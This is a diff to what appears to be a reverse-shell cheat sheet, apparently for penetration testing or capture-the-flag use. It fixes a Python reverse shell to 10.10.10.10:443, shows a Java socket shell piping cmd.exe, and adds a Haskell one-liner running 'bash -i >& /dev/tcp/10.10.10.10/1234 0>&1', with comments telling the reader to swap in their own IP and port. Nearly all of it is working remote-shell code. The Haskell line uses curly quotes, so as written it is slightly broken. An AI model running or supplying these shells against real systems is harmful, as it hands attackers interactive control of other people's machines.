@@ -46,7 +46,7 @@ s.connect(("10.10.10.10",443));
 os.dup2(s.fileno(),0);
 os.dup2(s.fileno(),1);
 os.dup2(s.fileno(),2);
-p=subprocess.call(["/bin/bash","-i"]);'
+p=subprocess.call(["/bin/bash","-i"]);
 
 // Replace the IP & Port
 
@@ -144,6 +144,21 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 // Replace Host & Port
+
+```
+
+# Haskell
+
+```
+One-Liner 
+-----------------------------------------------------------
+
+import System.Process
+main = do
+callCommand “bash -c ‘bash -i >& /dev/tcp/10.10.10.10/1234 0>&1’”
+
+// Replace IP & Port
+// Save script with .hs extension
 
 ```
 
